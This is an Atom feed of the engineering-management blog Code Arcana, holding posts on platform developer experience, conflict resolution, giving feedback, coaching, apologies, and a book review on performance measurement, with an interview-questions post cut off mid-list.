<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="https://codearcana.com/" rel="alternate"></link><link href="https://codearcana.com/feeds/all.atom.xml" rel="self"></link><id>https://codearcana.com/</id><updated>2022-03-23T00:00:00-07:00</updated><entry><title>An Ideal Platform Experience</title><link href="https://codearcana.com/posts/2022/03/23/an-ideal-platform-experience.html" rel="alternate"></link><published>2022-03-23T00:00:00-07:00</published><updated>2022-03-23T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2022-03-23:/posts/2022/03/23/an-ideal-platform-experience.html</id><summary type="html">&lt;p&gt;I've thought a while about the vision for Platform orgs. In short, my opinion
is that 
Platform orgs should prioritize making an incredible user experience &lt;em&gt;that does not require special domain expertise to use&lt;/em&gt; and allows Product teams to focus
all their energy on the business.
Unfortunately, Platform teams frequently …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I've thought a while about the vision for Platform orgs. In short, my opinion
is that 
Platform orgs should prioritize making an incredible user experience &lt;em&gt;that does not require special domain expertise to use&lt;/em&gt; and allows Product teams to focus
all their energy on the business.
Unfortunately, Platform teams frequently target making a very customizable experience at
the expense of making a simple one  -- they target making AWS when they
could make something easier to understand than Heroku. &lt;/p&gt;
&lt;p&gt;The net result of this focus is that the "cognitive load" of platform tools
can be quite high, and
sometimes product engineers find themselves needing (and missing) systems
domain expertise to configure and deploy their code. Eventually, these orgs 
usually reach towards  embedded devops engineers who act as a professional 
services org and fill 
the gap between product engineers and tools that require too much context to
be used by the product engineers.&lt;/p&gt;
&lt;p&gt;I believe that Platform orgs can avoid all this pain if they focus at the 
beginning on making an incrediable developer experience and use that as their
north star. With a sufficiently good focus on developer experience, maybe there
is no need for pure devops?&lt;/p&gt;
&lt;p&gt;Below is an alternative potential vision for how
to make a great platform experience.&lt;/p&gt;
&lt;h2&gt;Edit code&lt;/h2&gt;
&lt;p&gt;Ernie the Engineer picks up a new issue from the ticket tracking system to work on. &lt;/p&gt;
&lt;p&gt;Ernie creates a new branch on their local machine, write some code, and then want to run their code. They click a button in their IDE to create an ephemeral environment deployed into staging with all the dependencies of their service, attach their IDE as a remote debugger to their code while streaming the logs back to the IDE, and open their browser pointing to their new service. Since they are attached as with a remote debugger, they can quickly edit code and have it be automatically redeployed to the remote environment.&lt;/p&gt;
&lt;p&gt;They play around with the code to get it working, add some tests, and then push a new button in their IDE to create a draft code review by pushing their code to a new branch and opening the draft in their browser. The code review tool has suggested a template for the description and suggested some authors based on what files Ernie was editing. Ernie writes the description, links to the issue from the ticket tracking system, and then publishes the code for review by other engineers.&lt;/p&gt;
&lt;p&gt;Immediately after hitting publish, the code review system quietly starts to perform tests in the background. First it builds a packaged artifact and runs unit tests, then deploys the packaged artifact to a new ephemeral environment(s) and runs a set of integration tests (and in some cases, performance tests). If something goes wrong with the build or the tests, a short snippet of the error is posted and a link to the testing tool to get more information (or re-run the test with a debugger attached) is posted on the code review. When all the tests pass, a badge appears on the code review so all reviewers can see that fact.&lt;/p&gt;
&lt;p&gt;After gathering feedback and updating the code, Ernie has the approval to merge their code. They click a button on the code review tool that adds their change to a "submit queue", where all new changes are serially rebased onto &lt;code&gt;main&lt;/code&gt; and (if cleanly rebased) re-built and re-tested before being committed to &lt;code&gt;main&lt;/code&gt;. If anything goes wrong, Ernie gets an email/slack notification with a link to get more information (or re-run the test with a debugger attached). When the commit lands on &lt;code&gt;main&lt;/code&gt;, the review is automatically closed.&lt;/p&gt;
&lt;p&gt;Once the code is committed to &lt;code&gt;main&lt;/code&gt;, the packaged artifact from the submit queue is rolled out to production by deploying new copies of the service and shifting traffic from the old to the new. This process is done incrementally -- monitoring key metrics for the service and rolling back automatically if there is a drop in performance. If something does go wrong, a message is sent to the team's slack channel with a short snippet from the logs, a screenshot of the monitoring dashboard, and a link to learn more (or open up a remote debugger with the core dump loaded). &lt;/p&gt;
&lt;p&gt;When the code is all deployed to production, Ernie is free to delete their old branches from the local computer and all ephemeral environments are automatically cleaned up after not being used. &lt;/p&gt;
&lt;h2&gt;Adding a new dependency&lt;/h2&gt;
&lt;p&gt;Later, Ernie wants to add a dependency on another service (i.e. have their service make an RPC call to another service). &lt;/p&gt;
&lt;p&gt;They follow the same steps as above but then hit an error when trying to run the code: the message clearly says that the service is not authorized to make the RPC call and Ernie needs to add this authorization in the service portal with a helpful link. Ernie clicks the link and encounters a form pre-populated with the names of both services and the RPC endpoint(s) being hit, an optional text box to describe why, and the ability to describe how the testing system should handle the dependency for ephemeral environments (is it ok to have all ephemeral environments share a stable copy of the dependency, or should a new ephemeral copy of the dependency be created every time an ephemeral environment is created). Ernie isn't sure, so they trust the default of sharing a stable copy of the dependency. Ernie also knows that they will need to make additional RPC calls in the future so use the pre-populated list of endpoints to add them all. After Ernie hits submit on the form, a message is pushed to the team channel of the change Ernie made and they are able to finish developing their code as normal.&lt;/p&gt;
&lt;p&gt;(Note: Ernie didn't need any additional review of this change to the service config because their team chose to prioritize speed of development and the service they are making an RPC call to has no security restrictions. If either of these were different, Ernie would have instead gotten a link to a draft code review of some infrastructure configuration files where they could get others to approve the change.)&lt;/p&gt;
&lt;h2&gt;Creating a new service&lt;/h2&gt;
&lt;p&gt;Tina the Tech Lead goes to the service registry to create a new service. &lt;/p&gt;
&lt;p&gt;She goes to a new form where she types in the name of the new service and what language the service is in. The form asks for additional information (e.g. the repository, path, etc) but it is pre-populated with reasonable defaults based on the name of the service. The form asks if it should create a new group for operating this service or if it should share the same group as an additional service. If she wants to create a new group, Tina is asked to pick the name of the group (with a reasonable default chosen based on the name of the service) and add any members she chooses. Tina has the option to add custom metrics/SLOs for the service (with reasonable defaults based on her choice language) and add databases or caches. Lastly, Tina has the option to choose if this is an automatically scaled service or if she wants to manually configure the number and type of instances on which the service is deployed.&lt;/p&gt;
&lt;p&gt;After Tina hits submit, the service registry displays a dashboard with her service, the ability to configure it (add custom metrics, add databases or cached, authorize RPC calls, and modify maintainers), and a list of all environments (currently just production and maybe staging, but eventually also all active ephemeral environments). For each environment, she can see the cost per day, some high level counters of the traffic it is receiving, and a link to get more information (e.g. the monitoring dashboard, number of instances, a list of recent deployments). Behind the scenes, the service registry has created a pager duty group, several email groups (e.g. NAME-maintainers@company.com, NAME-announce@company.com, etc), created or deployed all databases and caches, etc.&lt;/p&gt;</content><category term="platform"></category></entry><entry><title>Escalate the channel, not the conflict</title><link href="https://codearcana.com/posts/2021/02/28/escalate-the-channel-not-the-conflict.html" rel="alternate"></link><published>2021-02-28T00:00:00-08:00</published><updated>2021-02-28T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2021-02-28:/posts/2021/02/28/escalate-the-channel-not-the-conflict.html</id><summary type="html">&lt;p&gt;&lt;em&gt;Escalate the channel, not the conflict&lt;/em&gt; is a principle of conflict resolution.
When a conversation with someone goes awry, switch to a more personal medium
of communication rather than escalating (e.g. to a boss, etc.).&lt;/p&gt;
&lt;p&gt;Talking privately in person is the most personal, then video chat, then voice
chat …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;em&gt;Escalate the channel, not the conflict&lt;/em&gt; is a principle of conflict resolution.
When a conversation with someone goes awry, switch to a more personal medium
of communication rather than escalating (e.g. to a boss, etc.).&lt;/p&gt;
&lt;p&gt;Talking privately in person is the most personal, then video chat, then voice
chat, then private text chat, then private email, then group email, then public
work tracking tool (e.g. issue tracker or code review).&lt;/p&gt;
&lt;p&gt;More personal channels allow people to more effectively convey emotions and 
empathize with each other, ideally avoiding conflicts. &lt;/p&gt;
&lt;p&gt;&lt;em&gt;Escalate the channel, not the conflict&lt;/em&gt;.&lt;/p&gt;</content><category term="management"></category><category term="communication"></category><category term="conflicts"></category></entry><entry><title>Giving feedback that is easy to listen to</title><link href="https://codearcana.com/posts/2020/11/06/giving-feedback-that-is-easy-to-listen-to.html" rel="alternate"></link><published>2020-11-06T00:00:00-08:00</published><updated>2020-11-06T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2020-11-06:/posts/2020/11/06/giving-feedback-that-is-easy-to-listen-to.html</id><summary type="html">&lt;p&gt;The whole point of feedback is to change someone’s behavior in the future. That only works if you can give it in a form that they can listen to. This is a template I got from the wonderful Manager Tools on how to give feedback in a way that …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The whole point of feedback is to change someone’s behavior in the future. That only works if you can give it in a form that they can listen to. This is a template I got from the wonderful Manager Tools on how to give feedback in a way that maximizes the chance that your feedback will be heard.&lt;/p&gt;
&lt;h2&gt;Use the "When you {verb}ed ... what happened was ..." model&lt;/h2&gt;
&lt;h3&gt;"When you"&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Identify the externally visible past behavior, not mindset or intent.&lt;/li&gt;
&lt;li&gt;You should be so descriptive (or so recent to the event) that they can identify a specific instance of them exhibiting the behavior&lt;/li&gt;
&lt;li&gt;Deliberately force yourself to give feedback about only specific instances and not patterns – it will force you to give feedback that is easier to listen to.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;"What happened was"&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Identify impact in the context of the event&lt;/li&gt;
&lt;li&gt;Great feedback uses impact that resonates with the listener, e.g. "the project delivered late" vs "Tim was sad" are valued differently by different people on the team.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Examples&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;"&lt;em&gt;&lt;strong&gt;When you&lt;/strong&gt;&lt;/em&gt; added an emoji to my slack message, &lt;em&gt;&lt;strong&gt;what happened was&lt;/strong&gt;&lt;/em&gt; I felt I was part of a team"&lt;/li&gt;
&lt;li&gt;"&lt;em&gt;&lt;strong&gt;When you&lt;/strong&gt;&lt;/em&gt; interrupted me when I was talking about API design in the team meeting, &lt;em&gt;&lt;strong&gt;what happened was&lt;/strong&gt;&lt;/em&gt; I stopped offering my perspective during the discussion"&lt;/li&gt;
&lt;li&gt;"&lt;em&gt;&lt;strong&gt;When you&lt;/strong&gt;&lt;/em&gt; provided an alternative doc comment in my code review, &lt;em&gt;&lt;strong&gt;what happened was&lt;/strong&gt;&lt;/em&gt; it was easy for me to incorporate the change"&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Subtle failure modes&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;"You come off as mean; for example, you interrupted me"&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Providing feedback of the form "pattern example" is especially dangerous, since it can create a story that is hard to recover from. (If the person stops interrupting, are they still mean?).&lt;/li&gt;
&lt;li&gt;Instead, prefer the form "instance consequence", so it is more clear that changing the behavior will change the effect: &lt;em&gt;"When you interrupted me, you came off as an asshole"&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;"When you started speaking while I was speaking, what happened was I felt insulted"&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Impact on your emotions is ok, but some words can accidentally ascribe intent (did the person intend to insult you?).&lt;/li&gt;
&lt;li&gt;Instead, prefer words that describe your emotional state (for examples, check out &lt;a href="https://www.cnvc.org/training/resource/feelings-inventory"&gt;this list&lt;/a&gt;): &lt;em&gt;"When you started speaking while I was speaking, what happened was I felt angry"&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;"When you interrupt me, what happens is I stop speaking"&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Giving feedback in present tense usually is about a pattern and is generally less credible; its easy for someone to say "I didn't do that" or "I stopped doing that" or "you only notice bad things", etc.&lt;/li&gt;
&lt;li&gt;Instead, use past tense and prefer feedback about specific examples: &lt;em&gt;"When you interrupted me in the team meeting, what happened is I stopped speaking"&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Get the right context&lt;/h2&gt;
&lt;p&gt;Manager Tools warns (rightly) that it is very dangerous to give feedback when
you can't be sure the other person knows its coming from a place of love:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Wait until you have a strong relationship to give feedback.&lt;/li&gt;
&lt;li&gt;Avoid doing it when angry.&lt;/li&gt;
&lt;li&gt;Aim to do it with a laugh and a wry smile on your face.&lt;/li&gt;
&lt;li&gt;Avoid doing it in writing, where people have to infer emotions.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Further reading&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.manager-tools.com/"&gt;Manager Tools&lt;/a&gt; is chock-full of great advice
  on feedback (and other management duties). I highly recommend starting from
  &lt;a href="https://www.manager-tools.com/manager-tools-basics"&gt;the basics&lt;/a&gt; and checking out podcasts like
  &lt;a href="https://www.manager-tools.com/2005/07/giving-effective-feedback"&gt;The Feedback Model&lt;/a&gt; or
  &lt;a href="https://www.manager-tools.com/2006/02/improve-your-feedback"&gt;Improve your feedback with DISC&lt;/a&gt; or
  &lt;a href="https://www.manager-tools.com/2019/09/event-based-peer-feedback-part-1"&gt;Event Based Peer Feedback&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.amazon.com/Nonviolent-Communication-Language-Marshall-Rosenberg/dp/1892005034"&gt;Nonviolent Communication: A Language of Life&lt;/a&gt;, by Marshall B. Rosenberg is a fantastic overview of communicating effectively about emotions.&lt;/li&gt;
&lt;/ul&gt;</content><category term="management"></category><category term="communication"></category></entry><entry><title>Coaching conversations: leadership micro-vacuums</title><link href="https://codearcana.com/posts/2020/05/29/coaching-conversations-leadership-micro-vacuums.html" rel="alternate"></link><published>2020-05-29T00:00:00-07:00</published><updated>2020-05-29T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2020-05-29:/posts/2020/05/29/coaching-conversations-leadership-micro-vacuums.html</id><summary type="html">&lt;p&gt;I have tried a script like this for the past year for engineers at around the Senior engineer level. I have been really happy with the results so far: the idea of "leadership mini-vacuums" makes growth here fairly approachable. The steps are small and people can choose to start with the step with which they are most comfortable.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I have tried a script like this for the past year for engineers at around the Senior engineer level. I have been really happy with the results so far: the idea of "leadership mini-vacuums" makes growth here fairly approachable. The steps are small and people can choose to start with the step with which they are most comfortable.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;EM&lt;/strong&gt;: "Think about the best run project you've ever seen. What was the name of that project?"&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IC&lt;/strong&gt;: &lt;em&gt;"Probably it would be the Foo project."&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;EM&lt;/strong&gt;: "And what about the Foo project did you really like?"&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IC&lt;/strong&gt;: &lt;em&gt;"Everything about it. There was a clear plan of what to do, the sprint planning meetings were well organized, the project excited senior leadership, and we even presented the project in an all-hands meeting."&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;EM&lt;/strong&gt;: "All of the things mentioned are the result of someone being a leader on the project in a small way. Every time your project is missing something from the Foo project, there is probably a 'leadership micro-vacuum' that you could volunteer to fill. For example, you could: run the sprint planning meetings, create a project plan with milestones and deliverables, or send out weekly status emails to senior leaders. There are all sorts of little ways you can help, so you can start with just one and pick your favorite."&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IC&lt;/strong&gt;: &lt;em&gt;"I'm worried that I won't do a good job on that, though"&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;EM&lt;/strong&gt;: "In fairness, you probably will not do as good a job as the Foo project on your first time.       You'll be slow, or make mistakes, or maybe just not be as polished. But if you never accept even a temporary drop in quality, you can never iterate and improve. Since I know that you are trying a new thing, I will be supportive to help you avoid mistakes and forgiving when you make them." &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IC&lt;/strong&gt;: &lt;em&gt;"I still feel weird doing some of those tasks."&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;EM&lt;/strong&gt;: "Unfortunately, you will have to push through the discomfort the first few times. One thing that helps me is realizing that "the uncomfortable feeling I have when I am doing something new" is the feeling of growing. The other thing that helps me is to do it the first few times with some who has done this before, like the Tech Lead."&lt;/p&gt;</content><category term="management"></category><category term="coaching"></category></entry><entry><title>Apologies</title><link href="https://codearcana.com/posts/2020/05/13/apologies.html" rel="alternate"></link><published>2020-05-13T00:00:00-07:00</published><updated>2020-05-13T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2020-05-13:/posts/2020/05/13/apologies.html</id><summary type="html">&lt;p&gt;Some thoughts on how to give better apologies.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;4 parts of an apology&lt;/h2&gt;
&lt;p&gt;I've been thinking about apologies recently. In both personal and
professional relationships, I've found that the best apologies have the
following 4 parts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;"What I did I was wrong"&lt;/li&gt;
&lt;li&gt;"I messed up when I ..."&lt;/li&gt;
&lt;li&gt;"I understand how this would cause you to feel ..."&lt;/li&gt;
&lt;li&gt;"In the future, I'm going to ..."&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This format has a few subtle points in it:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;"I was wrong" is an explicit admission of guilt and forces me to be
   sincere. It makes the apology much more effective.&lt;/li&gt;
&lt;li&gt;It is important to be specific about &lt;em&gt;what&lt;/em&gt; behavior was wrong. This
   specificity allows me to demonstrate that I listened by describing my
   behavior from their perspective. &lt;/li&gt;
&lt;li&gt;It is super powerful to reflect the person's emotion back to them. Again,
   this is an opportunity to demonstrate listening; this &lt;em&gt;also&lt;/em&gt; shows that I
   think their reaction was valid.&lt;/li&gt;
&lt;li&gt;Providing a short description of my corrective actions shows
   that I am taking responsibility for my behavior by providing an
   &lt;em&gt;unconditional&lt;/em&gt; commitment to change.&lt;/li&gt;
&lt;li&gt;It is relatively short, which makes it easy to remember and harder to drag
   out a potentially emotional process.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Some sample apologies&lt;/h2&gt;
&lt;p&gt;Put all together, an apology might sound like this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;"I'm sorry, I was wrong to shout at you in that fight. I understand how
   that made your feel scared. In the future, I'm going to take a few deep
   breaths to calm down."&lt;/li&gt;
&lt;li&gt;"I'm sorry about that meeting. I was wrong to report your status as red in
   front of your boss without discussing you first; I bet it made you feel
   frustrated. In the future, I'll make sure to sync up with you about the
   status beforehand."&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;How to screw up an apology&lt;/h2&gt;
&lt;p&gt;But there are a lot of ways I used to accidentally screw up apologies:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;I explained 'why' I acted that way.&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Saying "the reason why", "What I was thinking", "my intent was", or "because"
   is the fastest way to ruin the apology by making it about me, not them.
   Worse, it can make it seem like I am attempting to absolve myself of
   my mistake. 
   Instead, I find its better to say "It doesn't matter why I did that, I
   know it still made you feel ..."&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;I mentioned the other's behavior in my apology.&lt;/em&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Saying "I was wrong
   to raise my voice when you ..." is too close to offering an excuse (see the
   previous point).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;I waited for them to be ready to apologize&lt;/em&gt;. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I let a few important
   relationships sour because I was "right" and was waiting for the other
   person to apologize first.
   Instead, I try to apologize as soon as I am ready for &lt;em&gt;my part&lt;/em&gt;: the actions
   that I genuinely acknowledge were hurtful, ineffective, etc. Here, being
   specific about my behavior during the apology helps me be genuine. For
   example, "I was wrong to raise my voice".&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;I apologized for their reaction, not my behavior&lt;/em&gt;. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;"I was wrong to make you
   upset" or "I'm sorry that you got upset" are both missing the description
   of &lt;em&gt;my actions&lt;/em&gt; that provoked that reaction. Instead, I try to explicitly
   refer
   to my behavior: "I was wrong to shout" or "I was wrong to use a high
   pitched tone of voice."&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;I qualifed the apology&lt;/em&gt;. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Saying "I'm sorry if ..." or "in the future, I
   will ... if ..." similarly indicates only conditional acceptance of responsibility.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;I apologized in writing.&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This is a conversation where emotions
   matter; I now do it in the most personal channel I have available (in
   person &amp;gt; video call &amp;gt; phone call).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here are some of my favorite apology resources, that were inspirational for
this post:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=""&gt;Randy Pausch's The Last Lecture Ch. 47 A Bad Apology Is Worse Than No Apology&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.manager-tools.com/2006/10/do-you-need-to-apologize"&gt;Manager Tool's How to Apologize&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://baynvc.org/basics-of-nonviolent-communication/"&gt;Marshall Rosenberg's Non Violent Communication&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="management"></category><category term="communication"></category></entry><entry><title>A review of Measuring and Managing Performance in Organizations</title><link href="https://codearcana.com/posts/2018/09/07/a-review-of-measuring-and-managing-performance-in-organizations.html" rel="alternate"></link><published>2018-09-07T00:00:00-07:00</published><updated>2018-09-07T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2018-09-07:/posts/2018/09/07/a-review-of-measuring-and-managing-performance-in-organizations.html</id><summary type="html">&lt;p&gt;The central thesis of this book is that measuring employees will necessarily incentivize their behavior and measurement systems are doomed to by dysfunctional if any critical dimension of an employees role is not measured.&lt;/p&gt;</summary><content type="html">&lt;p&gt;On the advice of another Boy Scout leader, I read &lt;a href="https://smile.amazon.com/dp/B00DY3KQX6"&gt;&lt;em&gt;Measuring and Managing Performance in Organizations&lt;/em&gt;&lt;/a&gt; by Robert Austin. &lt;/p&gt;
&lt;h2&gt;An overview&lt;/h2&gt;
&lt;p&gt;This book is basically an extended doctoral thesis, written in 1996. It
discusses how employees are motivated by measurement, in particular focussing
on incentives that lead to disfunctional behavior.&lt;/p&gt;
&lt;p&gt;The book is dense and a bit self-indulgent&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;, but has a few fascinating points.&lt;/p&gt;
&lt;h2&gt;My Takeaways (tl;dr)&lt;/h2&gt;
&lt;p&gt;I think the key takeways of the book are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Measuring employee performance will necessarily incentivize behavior.&lt;/li&gt;
&lt;li&gt;Incentives will necessarily be disfunctional if any important
   dimension is not measured.&lt;/li&gt;
&lt;li&gt;Employees internal desire to do good work will cause them to natually choose
   an ideal allocation of labor, assuming they have perfect knowledge of what
   the customer wants.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I think this last assumption is critical -- most organizations try to silo
knowledge about the customer in a product management role. I think this
assumption is a key reason why &lt;em&gt;all&lt;/em&gt; employees (e.g. engineers) should be
expected to understand customer goals and information should be actively spread
to them; in my opinion, the role of product should be to disseminate information
so that all engineers can make good allocations.&lt;/p&gt;
&lt;h2&gt;Walk through of book&lt;/h2&gt;
&lt;h3&gt;Types of measurements&lt;/h3&gt;
&lt;p&gt;Austin first points out that there are two different types of measurements,
&lt;em&gt;motivational&lt;/em&gt; and &lt;em&gt;informational&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Motivational measurement is, by definition, intended to cause reactions in the people being measured, while informational measurement should be careful not to change the actions of the people being measured.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This distinction is only useful when talking about the intent of measurement;
he very quickly points out that if human beings are aware of the fact that they
are being measured, they will invariably change the motivations based on the
numbers. That is to say, there is no such thing as informational measures for
humans.&lt;/p&gt;
&lt;p&gt;Worse, this leads to the compromise of the measures:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The more any quantitative social indicator is used for social decision-making, the more subject it will be to corruption pressures and the more apt it will be to distort and corrupt the social processes it is intended to monitor&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;A model for employee motivation&lt;/h3&gt;
&lt;p&gt;Austin lays out a model for motivation with 3 parties, a customer, a principal
(or boss), and an agent (or employee). The agent has two types of tasks to work
on (e.g. cooking and cleaning or quantity and quality, etc) and must allocate 
time between them. The customer has a preference for the ratio of allocations 
between the two tasks (e.g. 40% cooking and 60% cleaning). The boss is
trying to figure out how to motivate the employee to do more work; 
the motivation system is considered to be &lt;em&gt;dysfunctional&lt;/em&gt; if the 
agent does not follow the customers preferred ratio.&lt;/p&gt;
&lt;p&gt;This model is a great framework for making key observations:
 - If the boss only incentivizes one of the two tasks, the employee will 
   natually do primarily that task and little of the other, leading to 
   dysfunction. &lt;em&gt;This is the key reason for dysfunction in organizations&lt;/em&gt;, 
   when not all of the &lt;em&gt;critical tasks&lt;/em&gt; are incentivized. If a motivation
   scheme misses a task important to a customer or if a dimension is hard to 
   measure (e.g. measuring quality), the system is doomed to by dysfunctional.
 - If you assume the employee is motivated by the desire to do a good job
   by pleasing the customer &lt;em&gt;and&lt;/em&gt; knows what the customer wants,
   then they will naturally seek out an allocation of time to tasks that 
   makes the customer happy.&lt;/p&gt;
&lt;h3&gt;Austin's Unsatisfying Conclusion&lt;/h3&gt;
&lt;p&gt;Austin clearly suggests that the best way to motivate employees is via internal
motivation, of doing a good job and supporting a team. He talks about a few
cultures that do this well (e.g. Japanese manufacturing), but doesn't give a
very compelling way to motivate employees to output more work -- increasing
compensation as a function of measured output would do so, but he clearly
indicates that he thinks it is impossible to measure output without
dysfunction. Worse, he thinks that providing external motivation usually ruins
an employee's internal motivation.&lt;/p&gt;
&lt;p&gt;One last interesting quote:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Customers verbalize only the most direct of three categories of desires when asked (see, for example, Hauser and Clausing, 1988). Customers do not mention needs that they assume will be met by all products of the type in question. And they do not mention product qualities that they have not thought of but would like. They mention only qualities that they do not expect but know that they want.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;Much like this blog post ...&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="reviews"></category><category term="management"></category></entry><entry><title>5 graceful questions to avoid a toxic engineering team</title><link href="https://codearcana.com/posts/2018/04/17/5-graceful-questions-to-avoid-a-toxic-engineering-team.html" rel="alternate"></link><published>2018-04-17T00:00:00-07:00</published><updated>2018-04-17T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2018-04-17:/posts/2018/04/17/5-graceful-questions-to-avoid-a-toxic-engineering-team.html</id><summary type="html">&lt;p&gt;While interviewing at a potential company, the engineer evaluating you asks the
obligatory "Any questions for me?". What do you ask?&lt;/p&gt;
&lt;p&gt;Some might be tempted to follow a checklist like the
&lt;a href="https://www.joelonsoftware.com/2000/08/09/the-joel-test-12-steps-to-better-code/"&gt;Joel Test&lt;/a&gt;&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;,
but I prefer to ask questions that allow me to be more diplomatic when probing
a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;While interviewing at a potential company, the engineer evaluating you asks the
obligatory "Any questions for me?". What do you ask?&lt;/p&gt;
&lt;p&gt;Some might be tempted to follow a checklist like the
&lt;a href="https://www.joelonsoftware.com/2000/08/09/the-joel-test-12-steps-to-better-code/"&gt;Joel Test&lt;/a&gt;&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;,
but I prefer to ask questions that allow me to be more diplomatic when probing
a company's values:&lt;/p&gt;
&lt;h2&gt;Can you show me a non-trivial code review?&lt;/h2&gt;
&lt;p&gt;In my favorite opening question, I immediately seem innocent and
curious while asking the engineer to show me something they are proud of. 
I maintain this demeanor while asking all future questions -- the interviewer
will be evaluating me on my questions, so I want to sound friendly with no
ulterior motives.&lt;/p&gt;
&lt;p&gt;But this question jumps directly to the heart of the engineering culture:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;How are disputes settled, e.g. about code style? Does the "highest paid
   person's opinion" win? Are people friendly or are does the company allow
   &lt;a href="http://www.brendangregg.com/blog/2017-11-13/brilliant-jerks.html"&gt;"brilliant jerks"&lt;/a&gt;?&lt;/li&gt;
